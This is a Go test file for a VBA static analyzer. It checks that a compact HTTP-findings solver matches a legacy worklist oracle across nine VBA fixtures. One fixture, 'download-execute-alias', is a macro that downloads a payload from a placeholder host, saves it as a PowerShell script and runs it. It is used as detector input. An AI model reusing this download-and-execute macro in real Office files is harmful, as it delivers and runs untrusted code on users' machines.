package analyze

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"testing"

	"github.com/harumiWeb/xlflow/internal/config"
	vbaast "github.com/harumiWeb/xlflow/internal/vba/ast"
	vbacfg "github.com/harumiWeb/xlflow/internal/vba/cfg"
	"github.com/harumiWeb/xlflow/internal/vba/procedureir"
)

// TestHTTPCompactMatchesPreMigrationTransfer compares the compact solver with
// the pre-#713 map worklist kept only in this test oracle. The historical
// #713 baseline revision was 6c9f8ba60c5b162cb7115e8e68744412c7de9d5d; the
// oracle intentionally stays in the test package so production never pays for
// the compatibility state or its map clones.
func TestHTTPCompactMatchesPreMigrationTransfer(t *testing.T) {
	fixtures := []struct {
		name   string
		source string
	}{
		{
			name: "tls-and-timeout",
			source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Option(4) = &H3300&
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`,
		},
		{
			name: "aliases-and-credentials",
			source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Dim aliasRequest As Object
    Set request = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set aliasRequest = request
    aliasRequest.Open "GET", "http://example.test", False
    request.SetRequestHeader "Authorization", "Bearer token-value"
    aliasRequest.Send
End Sub
`,
		},
		{
			name: "typed-new-prefix",
			source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As MSXML2.ServerXMLHTTP60
    Set request = New MSXML2.ServerXMLHTTP60
    request.Open "GET", "http://example.test", False, "user", "password"
    request.Send
End Sub
`,
		},
		{
			name: "branch-unknown-timeout",
			source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal configure As Boolean)
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    If configure Then request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`,
		},
		{
			name: "module-sensitive-header",
			source: `Attribute VB_Name = "Main"
Option Explicit
Private Const HEADER_NAME As String = "Authorization"
Private Const AUTH_VALUE As String = "Bearer module-token"
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.SetRequestHeader HEADER_NAME, AUTH_VALUE
    request.Send
End Sub
`,
		},
		{
			name: "download-execute-alias",
			source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Const target As String = "C:\Temp\payload.ps1"
    Dim request As Object
    Dim stream As ADODB.Stream
    Dim aliasStream As ADODB.Stream
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test/payload", False
    request.Send
    Set stream = New ADODB.Stream
    Set aliasStream = stream
    aliasStream.Write request.ResponseBody
    aliasStream.SaveToFile target, 2
    Shell "powershell.exe -File " & target
End Sub
`,
		},
		{
			name: "unknown-reassignment",
			source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal replaceRequest As Boolean)
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    If replaceRequest Then Set request = New Collection
    request.Open "GET", "http://example.test", False, "user", "password"
    request.Send
End Sub
`,
		},
		{
			name: "conflicting-object-kind",
			source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal useWinHTTP As Boolean)
    Dim first As Object
    Dim second As Object
    Dim target As Object
    If useWinHTTP Then
        Set first = CreateObject("WinHttp.WinHttpRequest.5.1")
    Else
        Set first = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    End If
    Set second = first
    Set target = second
    target.Open "GET", "http://example.test", False, "user", "password"
    target.Send
End Sub
`,
		},
		{
			name: "exceptional-timeout",
			source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    On Error GoTo TimeoutFailed
    request.SetTimeouts 1000, 1000, 1000, 1000
    Exit Sub
TimeoutFailed:
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`,
		},
	}
	for _, fixture := range fixtures {
		fixture := fixture
		t.Run(fixture.name, func(t *testing.T) {
			dir := t.TempDir()
			file, proc := loadHTTPDifferentialProcedure(t, dir, fixture.source)
			analyzer := Analyzer{RootDir: dir, Config: config.Default()}
			compact, err := analyzer.httpTransportFindingsContext(context.Background(), file, proc)
			if err != nil {
				t.Fatal(err)
			}
			legacy := legacyHTTPFindings(analyzer, file, proc)
			if got, want := httpFindingDigest(compact), httpFindingDigest(legacy); !sameStringSlice(got, want) {
				t.Fatalf("compact/pre-migration digest differs:\n compact=%#v\n legacy=%#v", got, want)
			}
		})
	}
}

func loadHTTPDifferentialProcedure(t *testing.T, dir, source string) (parsedFile, sourceProcedure) {
	t.Helper()
	path := filepath.Join(dir, "src", "modules", "Main.bas")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(source), 0o644); err != nil {
		t.Fatal(err)
	}
	doc, err := vbaast.ParseDocument(path, []byte(source))
	if err != nil {
		t.Fatal(err)
	}
	defer doc.Close()
	ir, err := procedureir.BuildParsed(procedureir.BuildOptions{RootDir: dir, Path: path, ModuleKind: "standard"}, doc)
	if err != nil {
		t.Fatal(err)
	}
	flow := vbacfg.BuildDocument(ir)
	procedures := sourceProceduresFromIRRef(&ir, flow)
	file := parsedFile{Path: path, Module: ir.ModuleName, ModuleKind: "standard", Source: []byte(source), Lines: normalizedSourceLines(source), IR: ir, CFG: flow, Procedures: procedures}
	file.ModuleFacts = buildModuleAnalysisFacts(file.Lines, file.IR, file.Procedures)
	for index := range file.Procedures {
		file.Procedures[index].ModuleFacts = file.ModuleFacts
	}
	for _, proc := range file.Procedures {
		if proc.Name == "Run" {
			return file, proc
		}
	}
	t.Fatal("Run procedure not found")
	return parsedFile{}, sourceProcedure{}
}

func legacyHTTPFindings(analyzer Analyzer, file parsedFile, proc sourceProcedure) []Finding {
	initial := newHTTPAnalysisState(file, mustProcedureIR(file.IR, proc))
	states := map[vbacfg.BlockID]httpAnalysisState{proc.Graph.Entry: cloneHTTPState(initial)}
	queue := []vbacfg.BlockID{proc.Graph.Entry}
	queued := map[vbacfg.BlockID]bool{proc.Graph.Entry: true}
	for len(queue) > 0 {
		id := queue[0]
		queue = queue[1:]
		queued[id] = false
		block, ok := proc.Graph.BlockByID(id)
		if !ok {
			continue
		}
		out := cloneHTTPState(states[id])
		if block.Statement != nil && !block.Statement.Recovered {
			out, _ = analyzer.transferHTTPStatement(file, proc, *block.Statement, out, false)
		}
		for _, edge := range proc.Graph.OutgoingEdges(id) {
			candidate := out
			if edge.Class == vbacfg.EdgeExceptional || edge.Uncertain {
				candidate = states[id]
			}
			previous, initialized := states[edge.To]
			merged, changed := joinHTTPState(previous, candidate, initialized)
			if !changed {
				continue
			}
			states[edge.To] = merged
			if !queued[edge.To] {
				queue = append(queue, edge.To)
				queued[edge.To] = true
			}
		}
	}
	ids := append([]vbacfg.BlockID(nil), proc.Graph.Reachable(vbacfg.EdgeFilter{})...)
	sort.Slice(ids, func(i, j int) bool { return ids[i] < ids[j] })
	seen := map[string]bool{}
	allSpecs := make([]httpFindingSpec, 0)
	for _, id := range ids {
		block, ok := proc.Graph.BlockByID(id)
		if !ok || block.Statement == nil || block.Statement.Recovered {
			continue
		}
		state, ok := states[id]
		if !ok {
			continue
		}
		_, specs := analyzer.transferHTTPStatement(file, proc, *block.Statement, state, true)
		for _, spec := range specs {
			key := fmt.Sprintf("%s|%d|%s|%s", spec.code, spec.line, spec.risk, spec.api)
			if seen[key] {
				continue
			}
			seen[key] = true
			allSpecs = append(allSpecs, spec)
		}
	}
	sort.SliceStable(allSpecs, func(i, j int) bool {
		if allSpecs[i].line != allSpecs[j].line {
			return allSpecs[i].line < allSpecs[j].line
		}
		return allSpecs[i].risk < allSpecs[j].risk
	})
	findings := make([]Finding, 0, len(allSpecs))
	for _, spec := range allSpecs {
		findings = append(findings, analyzer.httpFinding(file, proc, spec))
	}
	return findings
}

func mustProcedureIR(document procedureir.DocumentIR, proc sourceProcedure) procedureir.ProcedureIR {
	for _, candidate := range document.Procedures {
		if candidate.Symbol.Name == proc.Name {
			return candidate
		}
	}
	return procedureir.ProcedureIR{}
}

func sameStringSlice(left, right []string) bool {
	if len(left) != len(right) {
		return false
	}
	for index := range left {
		if left[index] != right[index] {
			return false
		}
	}
	return true
}
